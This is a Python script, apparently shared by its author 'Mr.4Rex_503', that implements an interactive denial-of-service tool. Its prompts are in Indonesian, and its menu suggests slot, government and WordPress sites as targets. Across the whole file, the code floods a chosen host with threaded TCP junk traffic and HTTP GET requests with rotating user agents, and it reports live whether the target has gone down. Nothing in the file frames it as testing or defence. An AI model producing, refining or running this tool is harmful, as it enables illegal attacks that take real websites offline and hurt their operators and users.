import threading
import socket
import random
import time
import http.client
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
import datetime
import os
import sys
import urllib.request

class DDoSChaos:
    def __init__(self):
        self.bytes_sent = 0
        self.lock = threading.Lock()
        self.target_down = False
        self.attack_running = False

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def get_ip_from_url(self, url):
        try:
            parsed = urlparse(url)
            host = parsed.netloc or url
            return socket.gethostbyname(host)
        except:
            return None

    def check_target_status(self, target_url):
        parsed = urlparse(target_url)
        host = parsed.netloc or target_url
        try:
            conn = http.client.HTTPConnection(host, timeout=2)
            conn.request("HEAD", "/")
            response = conn.getresponse()
            conn.close()
            return response.status < 400
        except:
            return False

    def syn_flood(self, target_ip, port, duration):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        end_time = time.time() + duration
        while time.time() < end_time and self.attack_running:
            try:
                sock.connect_ex((target_ip, port))
                sent = sock.send(random._urandom(1024))
                with self.lock:
                    self.bytes_sent += sent
            except:
                pass
        sock.close()

    def http_flood(self, target_url, duration):
        parsed = urlparse(target_url)
        host = parsed.netloc or target_url
        end_time = time.time() + duration
        while time.time() < end_time and self.attack_running:
            try:
                conn = http.client.HTTPConnection(host, timeout=1)
                conn.request("GET", "/", headers={"User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
                ])})
                response = conn.getresponse()
                sent = len(response.read())
                with self.lock:
                    self.bytes_sent += sent
                conn.close()
            except:
                pass

    def display_table(self, target_url, duration, threads):
        start_time = time.time()
        while self.attack_running and (time.time() - start_time) < duration:
            self.clear_screen()
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            target_status = self.check_target_status(target_url)
            with self.lock:
                bytes_sent = self.bytes_sent
            if not target_status and not self.target_down:
                self.target_down = True
                print("\n💥 TARGET DOWN DETECTED! 💥")
            
            print("╔════════════════════════════════════════════════════════════╗")
            print("║              😈 Mr.4Rex_503's DDoS Tool 😈                ║")
            print("╚════════════════════════════════════════════════════════════╝")
            print(f"Target: {target_url}")
            print(f"Status: {'DOWN' if self.target_down else 'UP'}")
            print(f"Threads: {threads}")
            print(f"Time: {current_time}")
            print("┌─────────────────────┬─────────────────────────┬──────────────┐")
            print("│ Timestamp           │ Bytes Sent              │ Target Status│")
            print("├─────────────────────┼─────────────────────────┼──────────────┤")
            print(f"│ {current_time} │ {bytes_sent} bytes       │ {'DOWN' if self.target_down else 'UP'}      │")
            print("└─────────────────────┴─────────────────────────┴──────────────┘")
            time.sleep(1)

    def attack(self, target_url, duration, threads):
        target_ip = self.get_ip_from_url(target_url)
        if not target_ip:
            print("URL ga valid, bro!")
            return

        self.attack_running = True
        self.bytes_sent = 0
        self.target_down = False

        print(f"🚀 Mulai nyerang {target_url} ({target_ip}) dengan {threads} threads selama {duration} detik! 😈")
        
        threading.Thread(target=self.display_table, args=(target_url, duration, threads), daemon=True).start()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(self.syn_flood, target_ip, random.randint(1, 65535), duration)
                executor.submit(self.http_flood, target_url, duration)

        self.attack_running = False
        self.clear_screen()
        print(f"💥 Serangan ke {target_url} selesai! Target {'DOWN' if self.target_down else 'UP'}! 😈")

    def main(self):
        while True:
            self.clear_screen()
            print("╔════════════════════════════════════╗")
            print("║   😈 Mr.4Rex_503's DDoS Tool 😈   ║")
            print("╚════════════════════════════════════╝")
            print("\nPilih target buat dihajar:")
            print("1. Situs Slot 🎰")
            print("2. Situs Negara 🏛️")
            print("3. WordPress 📝")
            print("4. Keluar 🚪")
            choice = input("Masukin pilihan (1-4): ")

            if choice == '4':
                print("Sampai jumpa, Mr.4Rex_503! Tetep bikin chaos, bro! 😈")
                break

            if choice not in ['1', '2', '3']:
                print("Pilihan ga valid, bro! Coba lagi.")
                time.sleep(2)
                continue

            target_url = input("Masukin URL target (contoh: http://example.com): ")
            try:
                duration = int(input("Berapa lama serangan (detik): "))
                threads = int(input("Berapa banyak threads (1-1000): "))
                if threads > 1000 or threads < 1:
                    print("Threads harus antara 1-1000, bro!")
                    time.sleep(2)
                    continue
                if duration < 1:
                    print("Durasi harus lebih dari 0 detik, bro!")
                    time.sleep(2)
                    continue
            except ValueError:
                print("Input ga valid, bro! Harus angka.")
                time.sleep(2)
                continue

            self.attack(target_url, duration, threads)
            input("Tekan Enter buat lanjut...")

if __name__ == "__main__":
    app = DDoSChaos()
    app.main()
